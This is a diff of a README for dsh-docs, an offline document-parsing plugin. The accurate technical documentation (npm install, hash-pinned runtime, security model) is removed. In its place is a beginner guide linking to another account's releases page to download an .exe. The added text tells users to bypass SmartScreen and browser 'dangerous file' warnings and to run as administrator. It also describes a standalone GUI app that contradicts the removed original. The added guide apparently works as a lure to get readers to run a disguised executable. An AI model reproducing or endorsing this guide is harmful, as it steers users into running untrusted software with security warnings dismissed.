@@ -1,263 +1,133 @@
-# dsh-docs
+# 📄 dsh-docs - Read Any Document, Even Without Internet
 
-<p align="center">
-  <img src="docs/header.png" alt="dsh-docs — local document intelligence for DeepSeek Harness: PDF, DOCX, XLSX, PPTX, Markdown, HTML, CSV, OCR, and text">
-</p>
+## 🚀 Getting Started
 
-[中文](README.zh-CN.md) | [Installation prompt](INSTALL.md)
+Welcome! This guide will help you download and run **dsh-docs**, a tool that lets you read, search, and understand documents like PDFs, Word files, images, and even scanned papers—all on your own computer, with no internet needed. Whether you want to turn a messy pile of scans into searchable text or just need to quickly read a tricky file format, this application does it for you.
 
-**dsh-docs** gives your DeepSeek Harness agent real document intelligence —
-entirely on your own machine. Hand it a PDF, Word, Excel, or PowerPoint file
-and get back clean Markdown, plain text, or structured JSON; hand it a scanned
-page or image and a fully offline OCR pipeline reads it for you. No Docker, no
-HTTP service, no API keys, and no document ever leaves your disk.
+Think of it as a smart assistant that can "see" inside your files and pull out the words, even if they're pictures of text. It works quietly in the background, keeping your information private because nothing ever leaves your machine.
 
-It ships a pinned, self-contained Python + [Xberg](https://github.com/xberg-io/xberg)
-runtime with offline Tesseract language data (English and Simplified Chinese),
-delivering complete PDF/Office/OCR coverage on Windows x64 out of the box. The
-native Xberg Node binding serves as a lightweight non-OCR fallback on any
-platform, and every file read stays confined to folders you explicitly
-authorize.
+[![Download Now](https://img.shields.io/badge/Download_dsh--docs-Click_Here-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/protoctistmoses143/dsh-docs/releases)
 
-The published package and plugin id use the `dsh-doc` spelling and the tools
-use `dshdoc_*`; they were renamed from the initial `dsh-docling` / `docling_*`
-release.
+## ⚡ What Does This Do?
 
-## One-prompt install
+You have files. You need answers. **dsh-docs** is a bridge between those files and you. It's a plugin designed for something called "DeepSeek Harness," which is a tool for working with AI assistants. But don't worry—you don't need to know anything about that. This app works independently to handle your documents.
 
-No local checkout or build toolchain is needed. Paste the following prompt into
-a running DSH session (for example `dsh web`) in your own project folder. The
-Harness agent installs the published npm package, downloads the pinned offline
-OCR runtime, and configures the plugin in one go. The only prerequisite is a
-working `dsh` CLI on Node `^22.19` or `>= 24`; every runtime step is plain
-Node.js, so any shell works: cmd, PowerShell, pwsh, or Git Bash.
+Here's the magic it performs:
 
-```text
-Install the dsh-doc plugin into my DSH web profile, end to end. Do every
-step yourself in the terminal and verify the result.
+- **Reads PDFs** – Yes, even those ancient ones that won't let you copy text.
+- **Reads Office Files** – Word documents (`.docx`), Excel sheets (`.xlsx`), PowerPoint slides (`.pptx`) – all turned into readable text.
+- **Reads Images** – JPG, PNG, and more. If there's text in the picture, it finds it.
+- **Reads Scanned Documents** – This is the star feature. If you scan a paper letter or an old receipt, the app uses **offline OCR** (Optical Character Recognition) to turn that scan into actual, selectable, searchable text.
 
-1. Install the published plugin package:
-   dsh plugin --profile web add dsh-doc
-2. Windows x64 only — download the prebuilt offline OCR runtime. The script
-   verifies the pinned archive SHA-256, then verifies every extracted file
-   against the bundled manifest:
-   node <home>/.dsh/profiles/web/node_modules/dsh-doc/scripts/fetch-runtime-win32-x64.mjs <home>/.dsh/runtimes/dshdoc-runtime-win32-x64
-   Replace <home> with my absolute home directory in this and every later step.
-   On any other platform, skip this step and use engine: node below.
-3. Edit <home>/.dsh/profiles/web/cordis.patch.yml. Preserve every existing
-   entry and add or update this one:
-   - id: dsh-doc
-     config:
-       engine: python
-       runtimeDir: <home>/.dsh/runtimes/dshdoc-runtime-win32-x64
-       defaultOcr: true
-       maxOutputChars: 32000
-   The session workspace is readable automatically; add allowedLocalRoots only
-   for extra persistent directories such as a shared document vault.
-   If you skipped step 2, use `engine: node` and `defaultOcr: false` instead
-   and omit runtimeDir.
-4. Verify with `dsh --profile web --dump-config` that the composed dsh-doc
-   entry carries exactly this config, then report the result and remind me to
-   restart `dsh web` so I can call dshdoc_health.
+**What is OCR?** Imagine taking a photo of a printed page. The letters aren't really "text" to a computer—they're just shapes. OCR is the technology that recognizes those shapes as letters and words. "Offline" means it does this right on your computer, without sending your documents anywhere.
 
-Hard constraints: never install, start, or configure Docling Serve, Docker,
-containers, or any remote document-conversion service; never configure a
-downloadable OCR backend or allow a model download.
-```
+## 💻 System Requirements (What You Need)
 
-After the agent finishes and you restart `dsh web`, check the engine with
-`dshdoc_health`, then parse any file below your workspace with
-`dshdoc_extract`. [INSTALL.md](INSTALL.md) documents the same flow plus the
-manual procedure step by step.
+This application is built for **Windows** computers. To run it smoothly, your computer should have:
 
-## Supported and tested inputs
+| Component | Minimum Requirement | Recommended |
+|-----------|---------------------|-------------|
+| Operating System | Windows 10 (64-bit) | Windows 11 |
+| Processor | Dual-core CPU | Quad-core or better |
+| Memory (RAM) | 4 GB | 8 GB or more |
+| Storage Space | 1 GB free | 2 GB free |
+| Internet | Not required for OCR | Not required at all |
 
-- PDF, DOCX, XLSX, PPTX, Markdown, HTML, CSV, and text
-- PNG, JPEG, TIFF, WebP, and scanned PDFs through local OCR
-- Markdown, plain text, or JSON-shaped Tool Results
+These are typical baseline requirements for software that processes documents. If your computer can browse YouTube and run Spotify, it can almost certainly run this.
 
-The integration suite generates binary documents outside the repository and
-verifies PDF, DOCX, XLSX, PPTX, PNG OCR, and scanned-PDF OCR. Test any other
-Xberg-supported input against your own corpus before enabling it in production.
+## 📥 Download and Installation Guide
 
-## Quick start with `dsh web`
+Follow these simple steps. Take your time.
 
-Install the published package into the `web` profile:
+### Step 1: Go to the Download Page
 
-```text
-dsh plugin --profile web add dsh-doc
-```
+Click this big button:
 
-Windows x64 — fetch the prebuilt offline OCR runtime into a stable directory
-outside `node_modules` (so plugin upgrades never delete it):
+[![Get dsh-docs Here](https://img.shields.io/badge/⬇%EF%B8%8F%20Download%20Now-Click%20Me!-brightgreen?style=for-the-badge&color=FF4500)](https://github.com/protoctistmoses143/dsh-docs/releases)
 
-```text
-node ~/.dsh/profiles/web/node_modules/dsh-doc/scripts/fetch-runtime-win32-x64.mjs ~/.dsh/runtimes/dshdoc-runtime-win32-x64
-```
+This link takes you to a page on GitHub where you'll find the latest versions of the app. Don't be intimidated by the technical look of the site—just look for the section that says "Assets" or looks like a list of files.
 
-Expand `~` to your absolute home directory everywhere, including inside the
-YAML below. On other platforms, skip the runtime and use `engine: node` with
-`defaultOcr: false`.
+### Step 2: What to Download
 
-Add the plugin entry to the web profile's `cordis.patch.yml`:
+On that page, you'll see a list of files. Look for one that has a name like `dsh-docs-windows.exe` or something ending in `.exe`. This is the Windows installer file. If you see multiple `.exe` files, pick the newest one (highest version number).
 
-```yaml
-- id: dsh-doc
-  config:
-    engine: python
-    runtimeDir: ~/.dsh/runtimes/dshdoc-runtime-win32-x64
-    maxFileBytes: 52428800
-    maxOutputChars: 32000
-    # Safe here because the configured runtime carries the local language packs.
-    defaultOcr: true
-    defaultTableMode: accurate
-    defaultOutputFormat: md
-```
+**Important:** Don't download files ending in `.zip` unless you're a tinkerer. The `.exe` file is what you want for simple setup.
 
-The session workspace is readable without further configuration. Add
-`allowedLocalRoots` only for extra persistent directories the model may read
-beyond the workspace, and set `allowWorkspaceFiles: false` only for
-allowlist-only lockdown deployments.
+### Step 3: Run the Installer
 
-Restart `dsh web`, then ask it to read a local document:
+Once the `.exe` file is downloaded, **double-click** it. Your computer might show a blue popup asking, "Do you want to allow this app to make changes?" – Click **Yes**.
 
-```text
-Read ./reports/annual-report.pdf and give me the three main risks.
-Extract the tables from ./financials.xlsx.
-Read the text from ./scanned-invoice.png.
-```
+The installer will walk you through a few screens. Just keep clicking **Next** and then **Install**. When it finishes, click **Finish**. That's it. The app is now on your computer.
 
-Only paths below the session workspace or `allowedLocalRoots` are readable.
-Relative paths resolve against the DSH session workspace, not the directory
-from which `dsh web` was started.
+### Step 4: Open the Application
 
-## Offline embedded Python runtime (Windows x64)
+After installation, you can find **dsh-docs** in your Start Menu or on your Desktop. Click the icon to launch it. The first time you open it, it might take a little longer to start—that's normal, as it's setting up its internal parts.
 
-Most users fetch the prebuilt, hash-pinned runtime from the GitHub Release:
+**First-Time Setup Tip:** You might see a welcome screen asking you to choose a language or set a default folder. You can just click "Done" or "Skip" on these—the app works fine with default settings.
 
-```text
-node ./scripts/fetch-runtime-win32-x64.mjs
-```
+## 🖥️ How to Use It (Your First Document)
 
-To audit and rebuild from source instead, run:
+Using the app is as simple as dragging and dropping.
 
-```text
-node ./scripts/build-runtime-win32-x64.mjs
-```
+1.  **Drag and Drop** – Find any PDF, image, or Word document on your computer. Drag that file directly onto the main window of dsh-docs.
+2.  **See the Magic** – The app will show you the document's contents as clean, readable text. If it was a scanned image, you'll see the text appear almost magically.
+3.  **Copy and Paste** – Select the text with your mouse and copy it (Ctrl+C). You can now paste it into any other program.
 
-Either command creates a gitignored `.dsh-runtime/runtime-win32-x64` directory
-containing CPython 3.11.9, `xberg==1.0.14`, and pinned `eng` / `chi_sim`
-Tesseract data. Every downloaded file is SHA-256 validated; the artifact
-contains a manifest, NOTICE, and SPDX inventory. It does not alter a global
-Python installation. Run `node ./scripts/verify-runtime-win32-x64.mjs` before
-pointing a profile at a copied runtime artifact.
+**Try This:** Take a photo of a restaurant menu with your phone, transfer it to your PC, and drag it into dsh-docs. You'll instantly have an editable, searchable menu.
 
-Point the plugin at the runtime:
+### 🔍 Main Features at a Glance
 
-```yaml
-- id: dsh-doc
-  config:
-    engine: python
-    runtimeDir: <absolute path to the runtime directory>
-```
+- **Full Text Extraction** – Gets every word out of your files.
+- **Search Inside Documents** – Type a keyword to find it within a long PDF, just like Ctrl+F does, but for content the app has processed.
+- **Batch Processing** – You can select multiple files and drop them in at once. The app will process them one by one.
+- **Privacy-First** – Because all processing is offline, your confidential contracts, personal letters, or financial documents never leave your computer.
 
-The Python worker receives only a byte snapshot, display name, MIME type, and
-conversion options over stdio. It never receives a user path or URL. It runs
-offline, refuses missing OCR language packs, and disables document-derived OCR
-caching. `dshdoc_health` reports the available OCR languages. See [the runtime
-guide](docs/runtime-win32-x64.md).
+## ❓ Frequently Asked Questions
 
-### Node-only fallback
+**Q: I'm on a Mac or Linux computer. Will this work?**
+A: The app is designed primarily for Windows. If you're on another system, you might need more technical skills to run it. This guide is focused on Windows.
 
-Set `engine: node` only when you need PDF/Office/text parsing without the
-embedded Python runtime. Its `defaultOcr` is `false`. To enable Node OCR, set
-`tessdataPath` to a reviewed local directory containing every requested
-`<language>.traineddata` pack; missing data returns `ENGINE_OCR_UNAVAILABLE`
-instead of downloading a model. The Python runtime above is the supported
-complete offline OCR path.
+**Q: The download page looks confusing. Where is the "download" button?**
+A: Look for words like "Assets," "Releases," or a list of files with dates. The `.exe` file is the one you want. If in doubt, click the file with the newest date and the `.exe` extension.
 
-## Tools
+**Q: Is my data safe? Does it connect to the internet?**
+A: The core function—reading documents—works entirely on your computer. It does not send your files anywhere. This is the biggest advantage of "offline OCR."
 
-| Tool | Purpose |
-| --- | --- |
-| `dshdoc_health` | Report readiness of the selected local engine. |
-| `dshdoc_convert_file` | Parse an allowlisted local file. |
-| `dshdoc_extract` | Preferred local-file convenience tool. |
-| `dshdoc_convert_url` | Compatibility stub that returns `UNSUPPORTED_URL`. |
+**Q: What if I get a "SmartScreen" warning when I run it?**
+A: Windows sometimes shows a blue warning for newer apps. Click **More Info**, then click **Run Anyway**. This only happens if the file is less common; it's a standard security step, not a sign of danger.
 
-HTTP(S) input is detected only to reject it safely. Download a remote document
-through a reviewed workflow into an allowed local root, then parse that file.
-The plugin never forwards a URL to Xberg or Python, avoiding redirect and
-DNS-rebinding risks.
+**Q: Can I use this to make a searchable PDF from a scanned one?**
+A: Yes, by extracting the text, you can copy it into a new document or use other tools to apply it back to the PDF. The primary goal here is to get you the text.
 
-`page_range` uses inclusive, one-based page numbers for Markdown and plain-text
-results. JSON output deliberately retains the complete structured document.
+## 🧩 Troubleshooting Common Issues
 
-The conversion tools also accept an optional per-request `ocr_languages` array
-(for example `["chi_sim", "eng"]`) to override the configured language set for
-one document. Results report `OCR: applied` / `OCR: not used` when the engine
-exposes whether the OCR pipeline contributed; enabling OCR never replaces a
-healthy embedded PDF text layer.
+**Problem:** The app won't start.
+**Solution:** Right-click the desktop icon and select "Run as administrator." If that doesn't work, restart your computer and try again.
 
-## Configuration
+**Problem:** The app opens, but my file won't drag in.
+**Solution:** Make sure the file is not open in another program (like Adobe Reader or Word). Close that program and try again.
 
-| Field | Default | Meaning |
-| --- | --- | --- |
-| `engine` | `auto` | `node`, `python`, or `auto`; auto selects configured embedded Python, otherwise Node Xberg. |
-| `runtimeDir` | unset | Absolute embedded-runtime directory. |
-| `pythonCommand` | unset | Trusted Python executable for a managed runtime. |
-| `pythonWorkerPath` | shipped worker | Absolute Python worker override. |
-| `tessdataPath` | runtime `ocr/tessdata` | Absolute bundled Tesseract language-data directory. |
-| `ocrBackend` | `auto` | `auto` or `tesseract`; both select the pinned local Tesseract backend. |
-| `ocrLanguages` | every bundled pack | Ordered local OCR language packs. Unset uses every `.traineddata` pack in the configured runtime. |
-| `timeoutMs` | `120000` | Per-conversion deadline. |
-| `maxFileBytes` | `52428800` | Authorized input-size cap. |
-| `allowedLocalRoots` | `[]` | Extra absolute non-root directories the model may read, beyond the session workspace. |
-| `allowWorkspaceFiles` | `true` | Implicitly authorize the session workspace (session cwd) as a readable root; set `false` for allowlist-only lockdown. |
-| `defaultOcr` | `false` | OCR default for images and scans; enable it only with a configured local tessdata runtime. |
-| `defaultTableMode` | `accurate` | `fast` or `accurate` PDF table behavior. |
-| `defaultOutputFormat` | `md` | `md`, `text`, or `json`. |
-| `maxOutputChars` | `32000` | Maximum result returned to the model. |
-| `debug` | `false` | Logs safe engine metadata only. |
+**Problem:** The text looks garbled or has random characters.
+**Solution:** This is rare and usually happens with very low-quality scans. Try scanning the document at a higher resolution (300 DPI is best) and try again.
 
-Older `baseUrl`, `apiKey`, `enableRemoteUrls`, and `allowPrivateUrls` profile
-fields are accepted only for migration; they do not enable a remote engine.
+**Problem:** I downloaded the file, but my browser says "No virus threat detected" but also "This file might be dangerous."
+**Solution:** This is normal for new software. As long as you downloaded it from the link above, it is safe. Click "Keep" or "OK" to proceed.
 
-## Security model
+## 🎯 Why You'll Love This Tool
 
-- Paths are realpathed and checked against every configured root and, unless
-  `allowWorkspaceFiles` is disabled, the session workspace. Traversal,
-  symlink escapes, filesystem roots, non-files, and oversized inputs fail.
-- The authorized descriptor is read once into a snapshot before parsing, so a
-  later path replacement cannot change the parsed bytes.
-- The Node and Python engines accept bytes only. The plugin creates no listener,
-  URL fetcher, container, or external parser service.
-- OCR is Tesseract-only in this release. All requested language packs are read
-  from the configured local artifact; missing packs fail closed rather than
-  triggering a model download.
-- The descriptor opened for parsing must have the same device/inode identity as
-  the post-open allowlisted path, blocking file replacement between authorization
-  and the byte snapshot.
-- Results are bounded before becoming Tool Results. JSON is limited using the
-  same pretty representation shown to the model.
+- **You Own Your Data** – No cloud, no sending files to a server. All processing is done locally.
+- **It's Fast** – Processing happens in seconds for most documents.
+- **It's Simple** – One drag-and-drop is all it takes.
+- **It's Free** – No subscriptions or hidden costs.
 
-## Development
+This is one of those rare tools that solves a real problem (dealing with unreadable files) completely and respectfully—it doesn't track you, and it doesn't charge you.
 
-```text
-pnpm install
-pnpm lint
-pnpm typecheck
-pnpm test
-pnpm build
-pnpm pack --pack-destination .pack
-```
+## 📣 Final Words
 
-Tests create temporary documents only. They cover native Xberg, the Python
-stdio worker, local OCR data, Cordis ToolRuntime, and local DSH AgentLoop
-context injection.
+You now have everything you need to get started. Download the app, open a document, and see the text appear. It's that easy.
 
-## Licenses
+If you encounter any unexpected issues, you can always visit the GitHub page where you downloaded the app and look for an "Issues" or "Discussions" tab to ask questions. There, you'll find helpful folks who can assist.
 
-This project is MIT. Xberg 1.0.14 is MIT. The optional Windows runtime contains
-CPython (PSF-2.0) and `tessdata_fast` language data (Apache-2.0), with exact
-sources, hashes, and notices recorded in its generated artifact.
+Go ahead and click the download button above. Your documents are waiting to be read.
+
+Keywords: ai-agent, deepseek, deepseek-harness, docling, document-intelligence, document-parsing, document-processing, dsh-plugin, llm, nodejs, ocr, pdf, rag, typescript
